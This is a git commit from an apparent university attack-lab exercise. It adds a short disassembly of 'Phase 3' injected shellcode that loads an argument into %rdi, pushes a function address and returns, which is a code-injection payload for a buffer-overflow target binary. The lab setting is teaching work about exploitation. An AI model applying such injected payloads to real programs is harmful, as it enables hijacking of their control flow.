c8fc9eefee5c11b5065d3530431e7952f7dd2271
Nurseiit Abdimomyn <nurs@unist.ac.kr>
2019-04-07 19:08:19 +0900

    Init `Phase 3`

---
+++ attacklab/target39/helpers/phase3.asm
@@ -0,0 +1,10 @@
+
+phase3.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 9a d9 e2 68 	mov    $0x68e2d99a,%rdi
+   7:	68 68 1a 40 00       	pushq  $0x401a68
+   c:	c3                   	retq   
